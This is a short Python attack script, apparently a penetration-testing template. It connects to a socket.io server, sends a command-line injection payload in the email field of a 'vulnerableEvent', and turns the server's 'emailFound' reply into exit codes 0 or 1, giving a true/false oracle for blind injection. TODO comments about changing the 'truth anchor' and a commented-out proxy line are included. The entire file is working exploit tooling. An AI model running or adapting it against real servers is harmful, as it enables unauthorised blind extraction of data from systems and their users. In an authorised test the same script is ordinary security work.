import pkg_resources
pkg_resources.require("python-socketio==4.6.0")

# Note regarding socket.io and versioning, check compatibility matrix for socket.io and python-socketio
## Target server is running node.js, using socket.io. 
## Important to have compatible versions, e.g., server runs "socket.io": "^2.3.0", which means python socket.io module should match version 4.x.
## Install older versions if necessary, e.g.: python3 -m pip3 install python-engineio==3.14.2 python-socketio[client]==4.6.0

# TODO 1: CHANGE TRUTH ANCHOR (search for TODO in this script)

import socketio
import requests
import os
import sys

url = sys.argv[1]
injectionPayload = sys.argv[2]

session = requests.session()
#session.proxies = {'http': 'http://localhost:8080'}

sio = socketio.Client(engineio_logger=True, http_session=session)

@sio.event
def connect():
    print("I'm connected!")
    sio.emit('vulnerableEvent', {"email":injectionPayload,"token":"someToken"})

@sio.event
def connect_error():
    print("The connection failed!")

@sio.event # short version of .on(bla), func name is server emitted event name in this case
def message(data):
    print('Message received: ' + data)

# TODO: CHANGE TRUTH ANCHOR
@sio.on('emailFound') # server code: socket.emit('emailFound', found);
def on_message(data):
    #print('checkEmail', data)
    if(data == False): # Truth anchor of injection
        os._exit(1) 
    else:
        os._exit(0)


sio.connect(url)
sio.wait()
